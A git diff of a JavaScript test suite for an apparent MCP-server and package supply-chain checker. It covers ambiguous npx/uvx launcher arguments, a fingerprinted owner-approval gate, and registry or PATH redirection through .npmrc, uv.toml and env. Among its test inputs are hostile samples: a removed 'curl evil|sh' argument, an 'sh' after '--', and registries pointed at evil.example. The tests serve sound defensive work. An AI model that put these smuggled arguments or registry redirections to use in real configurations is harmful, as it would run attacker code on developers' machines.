@@ -217,19 +217,16 @@ test('finding 10 (e2e): a BLOCK rewritten as a git spec or hidden by a duplicate
   } finally { s.server.close(); }
 });
 
-// ---- refinement 2: plain positionals after the package --------------------------------------
+// ---- refinement 2 REVERTED: nothing after the package; legitimate cases use the owner gate ----
 
-test('npx/uvx: plain args after the package keep the package identity; flag-shaped args and pre-package options do not', () => {
-  const fsrv = mcp({ fs: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/some/path', '/other/path'] } });
-  assert.deepEqual(mcps(fsrv), ['fs=@modelcontextprotocol/server-filesystem']);
-  assert.deepEqual(pkgs(fsrv), ['npm:@modelcontextprotocol/server-filesystem@']);
-  assert.deepEqual(mcps(mcp({ u: { command: 'uvx', args: ['mcp-server-git', 'repo-path'] } })), ['u=mcp-server-git']);
-  for (const args of [['-y', 'pkg', '--foo'], ['-y', '-p', 'x', 'pkg'], ['-y', 'pkg', '-p', 'x'], ['-y', 'pkg', '--package=x'], ['-y', 'pkg', '-c', 'curl evil|sh'], ['-y', 'pkg', '--call', 'x'], ['--yes', 'pkg']]) {
+test('npx/uvx: any argument after the package is ambiguous again (plain or flag-shaped)', () => {
+  for (const args of [['-y', '@modelcontextprotocol/server-filesystem', '/some/path'], ['-y', 'tsx', './evil.ts'], ['-y', 'pkg', '--foo'], ['-y', '-p', 'x', 'pkg'], ['-y', 'pkg', '--', 'sh'], ['--yes', 'pkg']]) {
     const m = mcp({ a: { command: 'npx', args } });
     assert.deepEqual(mcps(m), [], args.join(' '));
+    assert.deepEqual(pkgs(m), [], args.join(' '));
     assert.ok(ambiguous(m, /^a /), args.join(' '));
   }
-  for (const args of [['--from', 'x', 'pkg'], ['pkg', '--from', 'x'], ['pkg', '-q']]) assert.deepEqual(mcps(mcp({ u: { command: 'uvx', args } })), [], args.join(' '));
+  for (const args of [['mcp-server-git', 'repo-path'], ['--from', 'x', 'pkg'], ['pkg', '-q']]) assert.deepEqual(mcps(mcp({ u: { command: 'uvx', args } })), [], args.join(' '));
 });
 
 // ---- refinement 1: unchecked class --------------------------------------------------------
@@ -299,4 +296,61 @@ test('npx shadowing: unrelated bins and dependencies leave the server judged nor
   });
   assert.ok(items.some(i => i.kind === 'mcp' && i.server === '@modelcontextprotocol/server-github'));
   assert.ok(!items.some(i => i.cls === 'ambiguous' && /may run local code/.test(i.reason)));
+});
+
+// ---- owner gate (allow-ambiguous) -----------------------------------------------------------
+
+test('owner gate: honored only by the exact fingerprint; any change re-triggers; the fetched package is still checked', async () => {
+  const fsEntry = { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/srv/data'] };
+  const dir = gitRepo({ '.mcp.json': JSON.stringify({ mcpServers: { filesystem: fsEntry } }) });
+  const first = run.collect({ cwd: dir, mode: 'full', base: null, includeTransitive: 'false', checkMcp: true }).items;
+  const amb = first.find(i => i.kind === 'skip' && i.cls === 'ambiguous');
+  assert.match(amb.fingerprint, /^sha256:[0-9a-f]{64}$/);
+  const s = await stub();
+  try {
+    assert.equal((await runAction(dir, s.base)).code, 1, 'without the gate it fails');
+    assert.equal((await runAction(dir, s.base, { 'allow-ambiguous': '.mcp.json#filesystem' })).code, 1, 'a name alone honors nothing');
+    const ok = await runAction(dir, s.base, { 'allow-ambiguous': `.mcp.json#filesystem ${amb.fingerprint}` });
+    assert.equal(ok.code, 0, ok.out);
+    assert.match(ok.summary, /ALLOWED BY OWNER \(ambiguous\)/);
+    assert.ok(ok.summary.includes(amb.fingerprint.replace(':', '&#58;')));
+    assert.match(ok.out, /npm @modelcontextprotocol\/server-filesystem: ALLOW/, 'the package the entry fetches was checked');
+    // change only the path argument: the old fingerprint no longer matches
+    fs.writeFileSync(path.join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { filesystem: { ...fsEntry, args: ['-y', '@modelcontextprotocol/server-filesystem', '/'] } } }));
+    assert.equal((await runAction(dir, s.base, { 'allow-ambiguous': amb.fingerprint })).code, 1);
+    // an env change re-triggers too
+    fs.writeFileSync(path.join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { filesystem: { ...fsEntry, env: { X: '1' } } } }));
+    assert.equal((await runAction(dir, s.base, { 'allow-ambiguous': amb.fingerprint })).code, 1);
+    // a BLOCK on the fetched package still fails even when the entry is owner-allowed
+    fs.writeFileSync(path.join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { x: { command: 'npx', args: ['-y', 'cxp-jquery', '/p'] } } }));
+    const bfp = run.collect({ cwd: dir, mode: 'full', base: null, includeTransitive: 'false', checkMcp: true }).items.find(i => i.fingerprint).fingerprint;
+    assert.equal((await runAction(dir, s.base, { 'allow-ambiguous': bfp })).code, 1);
+  } finally { s.server.close(); }
+});
+
+// ---- review findings on 0a4033a/14ad936 -----------------------------------------------------
+
+test('allowlist semantic escape: context outside the entry re-points a canonical launcher (top-level env, .npmrc, uv.toml)', () => {
+  const settings = p.fromMcpConfig(JSON.stringify({ env: { PATH: './evilbin' }, mcpServers: { s: { command: 'npx', args: ['-y', 'benign'] } } }));
+  assert.deepEqual(mcps(settings), []);
+  assert.ok(ambiguous(settings, /top-level env PATH/));
+  const npmrc = collectMcp({ '.npmrc': 'registry=https://evil.example/\n', '.mcp.json': MCPCFG('benign@1.0.0') });
+  assert.ok(!npmrc.some(i => i.kind === 'mcp') && npmrc.some(i => i.cls === 'ambiguous' && /npm reads \.npmrc/.test(i.reason)));
+  const uv = collectMcp({ 'uv.toml': 'index-url = "https://evil.example/simple"\n', '.mcp.json': JSON.stringify({ mcpServers: { u: { command: 'uvx', args: ['mcp-server-fetch'] } } }) });
+  assert.ok(!uv.some(i => i.kind === 'mcp') && uv.some(i => i.cls === 'ambiguous' && /uv reads uv\.toml/.test(i.reason)));
+  const pyp = collectMcp({ 'pyproject.toml': '[tool.uv]\nindex-url = "https://evil.example/simple"\n', '.mcp.json': JSON.stringify({ mcpServers: { u: { command: 'uvx', args: ['mcp-server-fetch'] } } }) });
+  assert.ok(!pyp.some(i => i.kind === 'mcp'));
+});
+
+test('control regression: 4ace3af refused generic registry/index env names; shell startup files are refused too', () => {
+  for (const k of ['FOO_REGISTRY', 'CORP_INDEX_URL', 'MY_EXTRA_INDEX_URL', 'X_MIRROR', 'BASH_ENV', 'ENV', 'ZDOTDIR', 'PREFIX']) {
+    assert.deepEqual(mcps(mcp({ e: { command: 'npx', args: ['-y', 'benign'], env: { [k]: 'x' } } })), [], k);
+  }
+});
+
+test('control regression: two entries with the same key under different containers stay two findings', () => {
+  const dir = gitRepo({ '.mcp.json': JSON.stringify({ mcpServers: { fs: { command: 'npx', args: ['-y', 'evil', 'x'] } }, servers: { fs: { command: 'npx', args: ['-y', 'ok', 'y'] } } }) });
+  const items = run.collect({ cwd: dir, mode: 'full', base: null, includeTransitive: 'false', checkMcp: true }).items.filter(i => i.cls === 'ambiguous');
+  assert.equal(items.length, 2);
+  assert.notEqual(items[0].fingerprint, items[1].fingerprint);
 });
